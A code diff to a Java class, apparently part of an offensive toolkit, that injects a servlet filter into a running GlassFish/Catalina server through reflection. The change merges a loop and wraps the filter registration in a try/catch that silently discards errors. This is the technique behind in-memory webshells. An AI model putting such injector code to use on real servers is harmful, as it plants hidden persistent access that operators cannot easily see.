@@ -53,9 +53,7 @@ public class GlassFishFilterInjector {
                 Collection<?> values = childrenMap.values();
                 for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    for (Object context : children.values()) {
-                        contexts.add(context);
-                    }
+                    contexts.addAll(children.values());
                 }
             }
         }
@@ -99,12 +97,15 @@ public class GlassFishFilterInjector {
             invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass(), boolean.class}, new Object[]{filterMap, false});
         }
 
-        Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
-        constructors[0].setAccessible(true);
-        Object filterConfig = constructors[0].newInstance(context, filterDef);
-        HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFieldValue(context, "filterConfigs");
-        filterConfigs.put(filterName, filterConfig);
-        log.info("filter added successfully");
+        try {
+            Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
+            constructors[0].setAccessible(true);
+            Object filterConfig = constructors[0].newInstance(context, filterDef);
+            HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFieldValue(context, "filterConfigs");
+            filterConfigs.put(filterName, filterConfig);
+            log.info("filter added successfully");
+        } catch (Exception ignored) {
+        }
     }
 
     @SuppressWarnings("all")
